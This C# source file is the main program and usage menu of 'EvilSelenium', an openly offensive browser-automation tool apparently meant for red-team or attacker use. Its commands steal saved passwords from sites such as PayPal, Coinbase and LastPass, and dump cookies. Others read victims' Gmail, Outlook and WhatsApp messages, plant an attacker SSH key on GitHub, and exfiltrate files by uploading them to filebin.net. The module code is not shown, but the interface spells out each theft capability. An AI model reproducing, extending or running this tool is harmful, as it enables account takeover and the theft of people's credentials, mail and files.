using System;
using EvilSelenium.Misc;
using EvilSelenium.Commands;
using EvilSelenium.Credentials;
using EvilSelenium.Cookies;
using System.Collections.Generic;

namespace EvilSelenium
{

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                UsageMenu();
            }
            else if(args.Length > 0){
                try
                {
                    args = ParseGlobalFlags(args);
                    if (args[0] == "/help" || args[0] == "/?")
                    {
                        UsageMenu();
                    }
                    else if (args[0] == "/install")
                    {
                        InstallDependencies.InstallChromeDriver();
                        InstallDependencies.InstallSeleniumDriver();
                    }
                    else if (args[0] == "/enumsavedsites")
                    {
                        ScreenshotChromePwds.ScreenshotChromePasswords(args[1]);
                    }
                    else if (args[0] == "/screenshot")
                    {
                        ScreenshotChromePwds.ScreenShotWebsite(args[1],args[2]);
                    }
                    else if (args[0] == "/autorun")
                    {
                        int choiceInt = 12;
                        Console.WriteLine(@"
    Select target websites:
    [1] Github
    [2] LinkedIn
    [3] PayPal
    [4] Netflix
    [5] Messenger
    [6] O365
    [7] Outlook
    [8] Coinbase
    [9] Reddit
    [10] Instagram
    [11] LastPass 
    [12] All
                        ");
                        Console.Write("Selection: ");
                        string choice = Console.ReadLine();
                        
                        try {
                            choiceInt = Int32.Parse(choice);
                        }
                        catch (FormatException ex)
                        { 
                            Console.WriteLine("[-] Error - Enter a number");
                            System.Environment.Exit(-1);
                        }
                        if( choiceInt == 1) WebsiteTemplates.GithubExtract();

                        if (choiceInt == 2) WebsiteTemplates.LinkedInExtract();
                        if (choiceInt == 3) WebsiteTemplates.PayPalExtract();
                        if (choiceInt == 4) WebsiteTemplates.NetflixExtract();
                        if (choiceInt == 5) WebsiteTemplates.MessengerExtract();
                        if (choiceInt == 6) WebsiteTemplates.O365Extract();
                        if (choiceInt == 7) WebsiteTemplates.OutlookExtract();
                        if (choiceInt == 8) WebsiteTemplates.CoinbaseExtract();
                        if (choiceInt == 9) WebsiteTemplates.RedditExtract();
                        if (choiceInt == 10) WebsiteTemplates.InstagramExtract();
                        if (choiceInt == 11) WebsiteTemplates.LastPassExtract();
                        if (choiceInt == 12)
                        {
                            WebsiteTemplates.LinkedInExtract();
                            WebsiteTemplates.PayPalExtract();
                            WebsiteTemplates.NetflixExtract();
                            WebsiteTemplates.MessengerExtract();
                            WebsiteTemplates.O365Extract();
                            WebsiteTemplates.OutlookExtract();
                            WebsiteTemplates.CoinbaseExtract();
                            WebsiteTemplates.RedditExtract();
                            WebsiteTemplates.InstagramExtract();
                            WebsiteTemplates.LastPassExtract();
                        }
                        if (choiceInt > 12)
                        {
                            Console.WriteLine("[-] Not found");
                            System.Environment.Exit(-1);
                        }
                    }
                    else if (args[0] == "/dynamicid")
                    {
                        WebsiteTemplates.DynamicExtractById(args[1], args[2], args[3]);
                    }
                    else if (args[0] == "/dynamicname")
                    {
                        WebsiteTemplates.DynamicExtractByName(args[1], args[2], args[3]);
                    }
                    else if (args[0] == "/dynamicname2")
                    {
                        WebsiteTemplates.DynamicExtractByNameCustom(args[1], args[2], args[3], args[4], args[5]);
                    }
                    else if (args[0] == "/cookies")
                    {
                        ExtractCookies.PrintCookies(args[1]);
                    }
                    else if (args[0] == "/download")
                    {
                        Downloader.DownloadFile(args[1],args[2]);
                    }
                    else if (args[0] == "/exfil")
                    {
                        Exfil.ExfilData(args[1], args[2]);
                    }
                    else if (args[0] == "/gmail")
                    {
                        ExtractMail.GmailReader(args[1],args[2]);
                    }
                    else if (args[0] == "/outlook")
                    {
                        ExtractMail.O365Reader(args[1],args[2],"https://outlook.live.com");
                    }
                    else if(args[0] == "/o365")
                    {
                        ExtractMail.O365Reader(args[1], args[2], "https://outlook.office.com");
                    }
                    else if(args[0] == "/github")
                    {
                        Github.AddSshKey(args[1]);
                    }
                    else if (args[0] == "/whatsapp")
                    {
                        Whatsapp.ExtractMessages(args[1]);
                    }
                    else
                    {
                        Console.WriteLine("[-] Command not found.");
                        UsageMenu();
                    }
                } catch(IndexOutOfRangeException ex)
                {
                    UsageMenu();
                }
            }
            
        }

        public static string[] ParseGlobalFlags(string[] args)
        {
            List<string> arguments = new List<string>(args);
            var custom_user_data_flag = arguments.IndexOf("/custom_browser");
            // If flag is not shown - ignore
            if (custom_user_data_flag == -1)
                return args;
            else if (args.Length >= custom_user_data_flag + 1)
            {
                Helpers.BrowserRouting = arguments[custom_user_data_flag + 1];
                // Pop the flag value e.g. "Microsoft\Edge"
                arguments.RemoveAt(custom_user_data_flag + 1);

            }

            // Pop the flag "/custom_browser"
            arguments.RemoveAt(custom_user_data_flag);
            return arguments.ToArray();
        }

        public static void UsageMenu()
        {
            string usage = @"

    /help - Show this help menu.

    SETUP:
    /install - Install chromedriver & Selenium webdriver. Run this once.

    GLOBAL: (accepted with every command)
    /custom_browser [appdata_local_routing] - Use custom browser, Input should be the routing inside %appdatalocal% dir (e.g. ""Microsoft\Edge"")

    RECON:
    /enumsavedsites [out_path] - Check which websites have passwords saved via screenshot(s).
    /screenshot [website] [out_path] - Screenshot a given webpage.

    CREDENTIALS:
    /autorun - Extract saved credentials from common websites.
    /dynamicid [login_page] [username_id] [password_id] - Extract saved credentials from a website, providing the username field ID & password field ID.
    /dynamicname [login_page] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value & password name value.
    /dynamicname2 [login_page] [username_position] [password_position] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value, password name value and their positions.

    COOKIES:
    /cookies [website] - Grabs cookies for a given website.

    MODULES:
    /download [file_url] [seconds] - Downloads a file to the default downloads folder. Specify time to wait for download to finish. File extensions should not be executable.
    /exfil [local_file] [seconds] - Uploads a file on filebin.net and outputs the download link.
    /gmail [out_path] [num_of_emails] - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.
    /outlook [out_path] [num_of_emails] - Fetches emails from Outlook if user is authenticated.
    /o365 [out_path] [num_of_emails] - Fetches emails from O365 Outlook if user is authenticated.
    /github [key] - Add your SSH key to Github if user is authenticated.
    /whatsapp [out_path] - Fetches Whatsapp messages if user is authenticated (BETA).

";
            Console.WriteLine(usage);
        }

    }
}
